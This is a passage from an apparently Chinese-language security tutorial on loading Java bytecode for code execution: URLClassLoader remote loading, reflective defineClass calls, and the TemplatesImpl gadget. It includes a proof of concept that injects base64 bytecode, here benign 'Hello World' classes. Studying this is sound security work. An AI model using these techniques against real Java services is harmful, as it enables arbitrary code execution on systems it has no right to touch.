class=\"token class-name\">Method</span> method <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 假设类有 main 方法</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        method<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 调用 main 方法</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>成功请求到我们的 / Hello.class 文件，并执行了文件里的字节码，输出了 “Hello World”。</p>\n<p>所以，作为攻击者，如果我们能够控制目标 JAVA ClassLoader 的基础路径为一个 http 服务器，则可以利用远程加载的方法执行任意代码了</p>\n<h3 id=\"利用classloaderdefineclass直接加载字节码\"><a class=\"anchor\" href=\"#利用classloaderdefineclass直接加载字节码\">#</a> 利用 ClassLoader#defineClass 直接加载字节码</h3>\n<p>上文我们认识到了如何利用 URLClassLoader 加载远程 class 文件，也就是字节码。其实，不管是加载远程 class 文件，还是本地的 class 或 jar 文件，java 都经历的是下面这三个方法电用：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504101929209.png\" alt=\"image-20250410192910059\" /></p>\n<p>其中：</p>\n<pre><code>1.loadClass的作用是从已加载的类缓存，符加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行findeClass\n2.findClass的作用是根据基础URL指定的方法是来加载类的字节码，就像上一节中说到的，可能会在本地文件系统mjar包或者远程http服务器上读取字节码，然后交给defineClass\n3.defineClass的作用是处理前面传入的字节码，将其处理成真正的java类\n</code></pre>\n<p>所以可见，真正核心的部分其实是 defineClass，他决定了如何将一段字节流转变成变成一个 java 类，java 默认的 ClassLoader#defineClass 是一个 native 方法，逻辑在 JVM 的 C 语言代码中。</p>\n<p>我们可以编写一个简单的代码，；来演示<strong>如何让系统的 defineClass 来直接加载字节码</strong>：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">zijiema</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Base64</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> defineClass <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">Method</span> defineClass <span class=\"token operator\">=</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span>ClassLoader</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token string\">\"defineClass\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        defineClass<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token string\">\"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">Class</span> hello <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">)</span> defineClass<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span>ClassLoader</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSystemClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        hello<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Java 9+ 建议使用 hello.getDeclaredConstructor ().newInstance ()</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504101936698.png\" alt=\"image-20250410193640567\" /></p>\n<p>里面的 base64 代码是经过编译后的 Hello 类</p>\n<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显示地调用其构造函数，初始化代码才能被执行，而且，即使我们将初始化代码放在类的 static 块中，在 defineClass 时页无法被直接掉通道。所以，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。</p>\n<p>‘执行上述 example，输出了 Hello World：</p>\n<p>（如上图）</p>\n<p>这里因为系统地 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射地形式来调用。</p>\n<p>在实际场景中，因为 defineClass 方法作用域时不开放地，所以攻击者很少能直接利用到他，但他确实我们常用的一个攻击链 TemplatesImpl 的基石。</p>\n<h3 id=\"利用templatesimpl加载字节码\"><a class=\"anchor\" href=\"#利用templatesimpl加载字节码\">#</a> 利用 TemplatesImpl 加载字节码</h3>\n<p>虽然大部分上层开发者不会直接使用到 defineClass 方法，但是 java 底层还是有一些类用到了他，这就是 TemplatesImpl。</p>\n<p>com.sun.org.apache.salan.internal.xsltc.trax.TemplatesImpl 这个类中定义了一个内部类 TransletClassLoader：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TransletClassLoader</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ClassLoader</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">></span></span> _loadedExternalExtensionFunctions<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">TransletClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassLoader</span> parent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>_loadedExternalExtensionFunctions <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">TransletClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassLoader</span> parent<span class=\"token punctuation\">,</span><span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">></span></span> mapEF<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>_loadedExternalExtensionFunctions <span class=\"token operator\">=</span> mapEF<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> ret <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// The _loadedExternalExtensionFunctions will be empty when the</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// SecurityManager is not set and the FSP is turned off</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_loadedExternalExtensionFunctions <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ret <span class=\"token operator\">=</span> _loadedExternalExtensionFunctions<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ret <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>* Access to final protected superclass member from outer class.</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token class-name\">Class</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个类里面重写了 defineClass 方法，并且这里没有显示地声明其定义域。java 中默认情况下，如果一个方法<strong>没有显式声明作用域</strong>，其作用域为<strong> default</strong>。所以也就是说这里的 defineClass<strong> 由其符类地 potected 类型变成了一个 default 类型</strong>的方法，<strong>可以被类外部调用</strong>：</p>\n<p>我们从 TransletClassLoader#defineClass () 向前追溯一下调用链：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">getOutputProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">getTransletInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token class-name\">TemplatesImpl</span>#<span class=\"token function\">defineTransletClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">-></span> <span class=\"token class-name\">TransletClassLoader</span>#<span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>追到最前面两个方法 TemplatesImpl#getOutputProperties () 、</p>\n<p>TemplatesImpl#newTransformer () ，这两者的作用域式 public，可以被外部调用。我们尝试用 newTransformer () 构造一个简单的 POC：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">zijiema</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>trax<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TemplatesImpl</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>trax<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformerFactoryImpl</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Base64</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Templatesimpl</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// source: bytecodes/HelloTemplateImpl.java</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                        <span class=\"token class-name\">TemplatesImpl</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HelloTemplatesImpl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        obj<span class=\"token punctuation\">.</span><span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> fieldName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">Field</span> field <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span>fieldName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 让私有字段可访问</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>其中，setFieldValue方法用来设置私有属性，可见，这里我设置了三个属性：_bytecodes,_name和_tfactory。_bytecodes是哦与字节码组成的数组；_name可以是任意字符串，只要不为Null即可；\n\n_tfactory需要是一个TransformerFactoryImpl对象，因为TemplatesImpl#defineTransletClasses()方法理由调用到_tfactory.getExternalExtensionsMap(),如果是null会出错。\n\n另外，值得注意的是，TemplatesImpl中对加载的字节码是由一定要求的：这个字节码对应的类必须是com.sun.org.apache.xalan.internal.sxltc.runtime.AbstractTranslet的子类。\n</code></pre>\n<p>所以我们需要构造一个特殊的类：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DOM</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransletException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>runtime<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractTranslet</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 